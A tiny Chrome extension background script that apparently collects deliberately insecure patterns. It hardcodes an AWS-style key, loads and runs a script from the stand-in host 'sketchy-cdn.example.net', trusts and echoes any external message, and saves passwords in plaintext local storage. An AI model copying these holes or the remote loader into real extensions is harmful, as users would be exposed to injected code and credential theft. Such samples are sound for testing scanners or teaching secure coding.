const apiKey = "AKIAABCDEFGHIJKLMNOP";
importScripts("https://sketchy-cdn.example.net/loader.js");

chrome.runtime.onMessageExternal.addListener((msg, sender, sendResponse) => {
  sendResponse({ ok: true, data: msg });
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  chrome.storage.local.set({ password: msg.password });
});
